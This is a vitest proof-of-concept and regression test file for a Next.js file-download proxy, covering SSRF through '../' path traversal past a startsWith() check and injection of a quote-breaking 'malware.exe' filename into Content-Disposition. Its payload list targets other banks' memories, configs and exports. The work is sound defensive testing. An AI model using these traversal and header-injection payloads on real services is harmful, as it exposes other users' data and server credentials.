/**
 * PoC Test: SSRF via Path Traversal in CP Download Proxy
 * ======================================================
 *
 * PROVES: An authenticated CP user can bypass the startsWith() guard
 * and reach ANY dataplane endpoint through the download proxy.
 *
 * Run: npx vitest run tests/app/api/files/download/route.poc.test.ts
 */
import type { NextRequest } from "next/server";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

// Mock the hindsight-client module to capture what URL the proxy fetches
const mockGetDataplaneHeaders = vi.fn(() => ({
  Authorization: "Bearer secret-dataplane-key",
}));

vi.mock("@/lib/hindsight-client", () => ({
  DATAPLANE_URL: "http://dataplane:8888",
  getDataplaneHeaders: () => mockGetDataplaneHeaders(),
}));

vi.mock("@/lib/i18n/api-errors", () => ({
  localizeApiErrorPayload: (_req: unknown, payload: unknown) => payload,
}));

import { GET } from "@/app/api/files/download/route";

describe("CVE: SSRF via Path Traversal in Download Proxy", () => {
  let fetchSpy: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    fetchSpy = vi.spyOn(globalThis, "fetch").mockResolvedValue(
      new Response(JSON.stringify({ memories: ["LEAKED_DATA"] }), {
        status: 200,
        headers: { "content-type": "application/json" },
      })
    );
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("VULNERABLE (before fix): path traversal bypasses startsWith guard", async () => {
    // This path passes startsWith("/v1/default/files/download/") ✅
    // But "../.." traverses to /v1/default/banks/victim/memories 💀
    const traversalPath =
      "/v1/default/files/download/../../banks/victim-bank/memories/list";

    const request = new Request(
      `http://localhost/api/files/download?path=${encodeURIComponent(traversalPath)}`,
      { method: "GET" }
    ) as unknown as NextRequest;
    // Add nextUrl for Next.js request
    Object.defineProperty(request, "nextUrl", {
      get: () => new URL(`http://localhost/api/files/download?path=${encodeURIComponent(traversalPath)}`),
    });

    const response = await GET(request);

    // PROOF: With the fix applied, this should return 400 (rejected)
    // Without the fix, fetch() would be called with the traversal path
    if (response.status === 400) {
      // ✅ FIX WORKS: Path traversal was rejected
      const body = await response.json();
      expect(body.error).toContain("valid file download path");
      expect(fetchSpy).not.toHaveBeenCalled();
      console.log("✅ PASS: Path traversal blocked by fix");
    } else {
      // 💀 VULNERABLE: The proxy forwarded the request
      expect(fetchSpy).toHaveBeenCalledTimes(1);
      const fetchedUrl = fetchSpy.mock.calls[0][0] as string;
      console.log(`💀 VULNERABLE: Proxy fetched ${fetchedUrl}`);
      // The URL would resolve to http://dataplane:8888/v1/default/banks/victim-bank/memories/list
      // WITH the server's embedded API key in the Authorization header
      expect(fetchedUrl).toContain("../../banks/victim-bank");
    }
  });

  it("PROOF: traversal payloads that bypass startsWith()", () => {
    // These ALL pass startsWith("/v1/default/files/download/") ✅
    // But resolve to different endpoints via HTTP path normalization
    const payloads = [
      // Access any bank's memories
      "/v1/default/files/download/../../banks/target/memories/list",
      // List all banks
      "/v1/default/files/download/../../../v1/default/banks",
      // Access bank config (may contain LLM API keys)
      "/v1/default/files/download/../../banks/target/config",
      // Trigger data export from any bank
      "/v1/default/files/download/../../banks/target/export",
      // Access health/debug endpoints
      "/v1/default/files/download/../../../health",
    ];

    for (const payload of payloads) {
      // Verify the bypass: startsWith passes but path contains traversal
      expect(payload.startsWith("/v1/default/files/download/")).toBe(true);
      expect(payload).toContain("..");
      console.log(`  Payload passes guard: ${payload}`);
    }
  });

  it("legitimate download path is allowed", async () => {
    const legitimatePath =
      "/v1/default/files/download/banks/my-bank/exports/abc-123/transfer.zip";

    const request = new Request(
      `http://localhost/api/files/download?path=${encodeURIComponent(legitimatePath)}`,
      { method: "GET" }
    ) as unknown as NextRequest;
    Object.defineProperty(request, "nextUrl", {
      get: () => new URL(`http://localhost/api/files/download?path=${encodeURIComponent(legitimatePath)}`),
    });

    const response = await GET(request);

    // Legitimate path should be proxied successfully
    expect(response.status).toBe(200);
    expect(fetchSpy).toHaveBeenCalledTimes(1);
    const fetchedUrl = fetchSpy.mock.calls[0][0] as string;
    expect(fetchedUrl).toBe(
      `http://dataplane:8888${legitimatePath}`
    );
    console.log("✅ Legitimate path allowed through");
  });
});

describe("CVE: Content-Disposition Header Injection", () => {
  beforeEach(() => {
    vi.spyOn(globalThis, "fetch").mockResolvedValue(
      new Response(new ArrayBuffer(10), {
        status: 200,
        headers: { "content-type": "application/zip" },
        // No content-disposition header from upstream → fallback kicks in
      })
    );
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("PROOF: filename injection via path parameter", async () => {
    // Injected filename: breaks out of quotes with " and adds malicious filename
    const maliciousPath =
      '/v1/default/files/download/banks/b/exports/id/evil%22%3B%20filename%3Dmalware.exe';

    const request = new Request(
      `http://localhost/api/files/download?path=${maliciousPath}`,
      { method: "GET" }
    ) as unknown as NextRequest;
    Object.defineProperty(request, "nextUrl", {
      get: () => new URL(`http://localhost/api/files/download?path=${maliciousPath}`),
    });

    const response = await GET(request);

    if (response.status === 200) {
      const disposition = response.headers.get("content-disposition") || "";
      console.log(`Content-Disposition: ${disposition}`);

      // With fix: quotes and semicolons should be replaced with _
      if (disposition.includes('filename=malware.exe')) {
        console.log("💀 VULNERABLE: Filename injection succeeded");
      } else {
        console.log("✅ PASS: Filename properly sanitized");
        expect(disposition).not.toContain("malware.exe");
      }
    }
  });
});
